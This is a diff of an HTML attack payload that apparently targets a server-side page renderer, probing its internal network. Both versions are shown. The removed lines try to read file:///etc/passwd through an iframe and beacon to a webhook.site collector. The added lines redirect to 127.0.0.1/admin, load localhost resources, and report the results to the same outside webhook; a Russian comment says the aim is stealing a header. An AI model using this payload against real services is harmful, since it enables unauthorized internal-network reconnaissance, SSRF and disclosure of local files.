@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <link rel="dns-prefetch" href="http://rce-check-dns.5d2815a1-7a4c-4d21-9462-22b22be8d349.webhook.site">
+    <meta http-equiv="refresh" content="0; url=http://127.0.0.1:80/admin">
 </head>
 <body>
-    <img src="https://kirayoshikage67.github.io/gfhgfhfhgfhg/exploit.py">
+    <script>
+        const hook = "https://webhook.site/5d2815a1-7a4c-4d21-9462-22b22be8d349";
+        
+        // Попытка украсть заголовок через рекурсивный фрейм
+        var ifr = document.createElement('iframe');
+        ifr.src = "http://127.0.0.1:80/";
+        ifr.onerror = () => { new Image().src = hook + "/PORT_80_BLOCKED"; };
+        document.body.appendChild(ifr);
+    </script>
 
-    <iframe src="file:///etc/passwd" width="0" height="0"></iframe>
-
-    <meta http-equiv="refresh" content="0; url=https://webhook.site/5d2815a1-7a4c-4d21-9462-22b22be8d349/META_REFRESH_HIT">
-
-    <style>
-        body {
-            background-image: url("https://webhook.site/5d2815a1-7a4c-4d21-9462-22b22be8d349/CSS_LOAD_HIT");
-        }
-    </style>
+    <link rel="stylesheet" href="http://127.0.0.1:80/style.css" onload="new Image().src='https://webhook.site/5d2815a1-7a4c-4d21-9462-22b22be8d349/INTERNAL_CSS_LOADED'">
 </body>
 </html>
